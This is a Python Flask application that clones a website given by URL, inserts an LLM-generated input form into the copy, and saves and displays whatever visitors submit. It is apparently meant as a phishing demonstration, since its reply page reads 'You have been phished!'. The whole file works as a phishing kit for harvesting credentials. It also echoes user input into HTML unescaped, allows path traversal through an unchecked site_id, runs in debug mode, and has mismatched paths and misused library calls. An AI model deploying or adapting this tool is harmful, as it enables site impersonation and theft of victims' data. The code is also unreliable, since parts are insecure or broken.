from flask import Flask, request, render_template, redirect, url_for, jsonify
from bs4 import BeautifulSoup
import os
import requests
import json
from langchain import LLMChain, PromptTemplate
from langchain.llms import GPT4All

app = Flask(__name__)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Load a local language model
llm = GPT4All(model="Meta-Llama-3-8B-Instruct.Q4_0.gguf")

def scrape_website(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    return soup

def copy_resources(soup, base_url, target_dir):
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)
    
    for tag in soup.find_all(['link', 'script', 'img']):
        attr = 'href' if tag.name == 'link' else 'src'
        if tag.has_attr(attr):
            resource_url = tag[attr]
            if resource_url.startswith(('http', 'https')):
                resource_content = requests.get(resource_url).content
                resource_path = os.path.join(target_dir, os.path.basename(resource_url))
                with open(resource_path, 'wb') as f:
                    f.write(resource_content)
                tag[attr] = os.path.join('static', os.path.basename(resource_url))

    with open(os.path.join(target_dir, 'index.html'), 'w') as file:
        file.write(str(soup))

def generate_form_with_langchain():
    template = "Generate a simple HTML form with one text input and a submit button."
    prompt = PromptTemplate(template)
    chain = LLMChain(prompt_template=prompt, llm=llm)
    form_html = chain.run()
    return form_html

def add_phishing_form(soup, target_dir):
    form = soup.find('form')
    if not form:
        form_html = generate_form_with_langchain()
        form_soup = BeautifulSoup(form_html, 'html.parser')
        soup.body.insert(0, form_soup)
    
    with open(os.path.join(target_dir, 'index.html'), 'w') as file:
        file.write(str(soup))

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        site_id = len(os.listdir(os.path.join(BASE_DIR, 'generated_sites')))
        target_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id))
        data_dir = os.path.join(target_dir, 'data')
        if not os.path.exists(data_dir):
            os.makedirs(data_dir)
        soup = scrape_website(url)
        copy_resources(soup, url, target_dir)
        add_phishing_form(soup, target_dir)
        return redirect(url_for('generated_site', site_id=site_id))

    return render_template('index.html')

@app.route('/site/<int:site_id>')
def generated_site(site_id):
    return redirect(url_for('static', filename=f'generated_sites/{site_id}/index.html'))

@app.route('/submit', methods=['POST'])
def handle_submit():
    data = request.form['user_input']
    site_id = request.args.get('site_id')
    data_file = os.path.join(BASE_DIR, 'generated_sites', site_id, 'data', 'data.json')
    
    if os.path.exists(data_file):
        with open(data_file, 'r') as file:
            data_list = json.load(file)
    else:
        data_list = []

    data_list.append(data)
    with open(data_file, 'w') as file:
        json.dump(data_list, file)
    
    return f"""
    <h1>You have been phished!</h1>
    <p>Your submitted data: {data}</p>
    <p><a href='/data/{site_id}'>View Collected Data</a></p>
    <p>Please delete your data if it's real and take necessary precautions.</p>
    """

@app.route('/data/<int:site_id>')
def view_data(site_id):
    data_file = os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'data', 'data.json')
    if os.path.exists(data_file):
        with open(data_file, 'r') as file:
            data_list = json.load(file)
        return jsonify(data_list)
    else:
        return "No data found."

@app.route('/delete/<int:site_id>/<int:data_index>', methods=['POST'])
def delete_data(site_id, data_index):
    data_file = os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'data', 'data.json')
    if os.path.exists(data_file):
        with open(data_file, 'r') as file:
            data_list = json.load(file)
        if 0 <= data_index < len(data_list):
            data_list.pop(data_index)
            with open(data_file, 'w') as file:
                json.dump(data_list, file)
    return redirect(url_for('view_data', site_id=site_id))

if __name__ == '__main__':
    app.run(debug=True)
